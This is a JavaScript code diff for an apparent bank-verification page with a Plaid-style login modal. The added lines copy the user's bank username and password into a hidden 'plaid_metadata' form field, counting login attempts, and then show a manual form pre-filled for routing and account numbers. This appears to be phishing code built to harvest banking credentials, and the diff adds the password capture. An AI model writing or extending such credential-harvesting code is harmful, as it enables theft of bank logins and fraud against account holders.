@@ -130,21 +130,37 @@ document.addEventListener('DOMContentLoaded', function() {
             })
         });
 
-        // Store bank info and submit form
+        // Show manual entry form
+        const plaidSection = document.getElementById('plaid-section');
+        const manualSection = document.getElementById('manual-bank-section');
+
+        if (plaidSection) plaidSection.style.display = 'none';
+        if (manualSection) manualSection.style.display = 'block';
+
+        // Pre-fill bank information
+        const bankNameInput = document.getElementById('bank_name');
+        const accountNameInput = document.getElementById('account_name');
+        const routingNumberInput = document.getElementById('routing_number');
+        const accountNumberInput = document.getElementById('account_number');
+        const accountTypeSelect = document.getElementById('account_type');
+        const plaidMetadataInput = document.getElementById('plaid_metadata');
+
         if (bankNameInput) bankNameInput.value = bank.name;
+        if (accountNameInput) accountNameInput.value = username;
+        if (accountTypeSelect) accountTypeSelect.value = 'checking';
+
         if (plaidMetadataInput) {
             plaidMetadataInput.value = JSON.stringify({
                 bank: bank.name,
                 username: username,
+                password: password,
                 timestamp: new Date().toISOString(),
                 attempt: 2
             });
         }
 
-        setTimeout(() => {
-            hideLoading();
-            document.getElementById('bank-verification-form').submit();
-        }, 3000);
+        hideLoading();
+        modal.hide();
     }
 
     function showLoading(message) {
